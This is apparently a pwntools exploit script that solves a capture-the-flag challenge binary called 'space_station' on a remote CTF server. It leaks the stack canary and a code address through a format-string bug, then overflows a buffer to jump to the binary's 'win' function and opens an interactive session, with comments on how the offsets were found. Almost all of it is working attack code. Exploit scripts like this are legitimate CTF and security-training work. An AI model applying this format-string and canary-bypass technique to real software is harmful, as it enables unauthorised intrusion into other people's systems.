#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF("./space_station", checksec=False)

#found by printing %p... as first input (value with last byte to 0)
CANARY_IDX = 15
#found by printing %p... as first input (value starting with 0x555555)
#points at something inside the .text code section
BASE_IDX = 17

#python3 -c "from pwn import *; print(cyclic(100)) as input + debug tofind canary offset
OFFSET_TO_CANARY = 72
#rip offset is canary offset + canary (8B) + saved RPB (8B)
OFFSET_TO_RIP = 88
ret = 0x000000000000101a


p = remote("offsec.m0lecon.it", 13550)

p.recvuntil(b"ID: ")
p.sendline(f"%{BASE_IDX}$lx %{CANARY_IDX}$lx".encode())

line = p.recvline().strip().split()

leak = int(line[0], 16)
canary = int(line[1], 16)

#offset = leaked address - base
#base found with vmmap
pie_offset = leak - 0x139e

log.info(f"canary = {canary:#x}")
p.recvuntil(b"log: ")
payload = flat(
b"A" * OFFSET_TO_CANARY,
p64(canary),
b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
p64(ret+pie_offset),
p64(elf.sym.win+pie_offset),
)
p.sendline(payload)


p.interactive()


# Your exploit here

